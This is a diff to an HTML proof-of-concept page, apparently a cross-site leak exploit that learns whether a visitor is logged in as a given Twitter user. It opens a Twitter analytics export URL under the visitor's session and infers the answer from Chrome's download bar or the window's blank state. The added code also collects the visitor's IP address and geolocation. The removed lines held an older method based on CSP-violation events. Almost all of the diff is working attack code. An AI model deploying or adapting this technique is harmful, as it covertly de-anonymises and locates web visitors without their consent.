@@ -2,7 +2,6 @@
 <html>
     <head>
         <title>XPOC</title>
-        <meta http-equiv="Content-Security-Policy" content="default-src 'unsafe-inline' https://red-assassin.github.io https://api.hackertarget.com/ https://www.cloudflare.com https://analytics.twitter.com https://code.jquery.com https://maxcdn.bootstrapcdn.com https://cdnjs.cloudflare.com https://maxcdn.bootstrapcdn.com">
         <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
         <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
         <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
@@ -46,12 +45,12 @@
             window.dataip = null
             var cloudFlare = "https://www.cloudflare.com/cdn-cgi/trace";
             var whois = "https://api.hackertarget.com/geoip/?q="
-
+            var downloadBarSize = 49;
             var getwhois = (ip) => {
                 fetch(whois+ip).then((resp) => {
                     return resp.text();
                 }).then((data) => {
-                    document.getElementById("whoisinfo2").innerHTML += "<pre>"+data+"</pre>";
+                    document.getElementById("whoisinfo2").innerHTML = "<pre>"+data+"</pre>";
                 });
             }
 
@@ -61,31 +60,39 @@
                         return resp.text();
                     }
                 ).then((data) => {
-                    document.getElementById("whoisinfo").innerHTML += "<pre>"+data+"</pre>";
+                    document.getElementById("whoisinfo").innerHTML = "<pre>"+data+"</pre>";
                     window.dataip = data.split("\n")[2].split("=")[1];
                     getwhois(window.dataip);
                 });
             }
-
-            document.addEventListener('securitypolicyviolation', e => {
-            // goes through here if a 3xx redirect to another domain happened
-                console.log(e.blockedURI);
-                window.blocked = true;
-            });
             function checkOwner(){
                 var result = document.getElementById("result");
                 var user = document.getElementById("do").value;
-                fetch('https://analytics.twitter.com/user/'+user+'/home', {mode: 'no-cors',credentials: 'include'});
-                setTimeout(() => {
-                    
-                    if(window.blocked)
-                        result.innerHTML = "[+] Nothing found.<br />";
-                    else{
-                        result.innerHTML = "[+] Twitter user "+user+", Details of the User<br />";
-                        getUserInfo();
+                var windowHeight = window.innerHeight;
 
+                //fetch("https://analytics.twitter.com/user/"+user+"/tweets/export.json?start_time=1581897600000&end_time=1584316799999&lang=en&export_type=by_tweet", {method: 'POST', mode: 'no-cors',credentials: 'include'});
+
+                if(win == null)
+                    var win = window.open();
+                
+                win.location = "https://analytics.twitter.com/user/"+user+"/videos/account_stats.json?start_time=1581897600000&end_time=1584316799999"
+
+                setTimeout(() => {
+                    var margin = windowHeight - window.innerHeight;
+                    try{
+                        //below condition one is for download bar chrome
+                        if(margin == downloadBarSize || win.location.href == "about:blank"){
+                            result.innerHTML = "[+] You are twitter user, username "+user+", below are your details";
+                            getUserInfo();
+                            
+                        }else{
+                            result.innerHTML = "[+] Nothing found"
+                        }
+                    }catch(error){
+                        //DOMException will occur if window.location.href does not point to blank, this is for checking in firefox
+                        result.innerHTML = "[+] Nothing found"
                     }
-                }, 3000);
+                }, 10000);
                 
             }
         </script>
